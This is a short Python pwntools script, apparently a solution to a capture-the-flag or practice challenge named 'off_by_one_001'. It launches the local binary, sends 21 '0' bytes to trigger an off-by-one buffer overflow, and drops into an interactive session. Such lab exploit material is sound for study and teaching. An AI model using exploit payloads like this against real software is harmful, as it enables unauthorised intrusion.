from pwn import *

p = process('./off_by_one_001')

p.send(b"0"*21)
p.interactive()